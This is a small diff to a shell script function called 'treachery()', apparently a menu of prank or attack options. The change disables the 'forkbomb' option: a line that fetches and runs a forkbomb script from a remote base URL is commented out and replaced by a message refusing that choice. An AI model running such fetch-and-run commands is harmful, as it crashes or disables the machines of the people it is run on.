@@ -75,7 +75,8 @@ treachery(){
 			;;
 		"4"|"forkbomb")
 			echo "Forkbomb chosen"
-			webru ${BASEURL}/assorted/forkbomb.sh
+			# webrun ${BASEURL}/assorted/forkbomb.sh
+			echo "wtf is wrong with you, choose something else"
 			;;
 		"5"|"gif")
 			echo "Gif chosen"
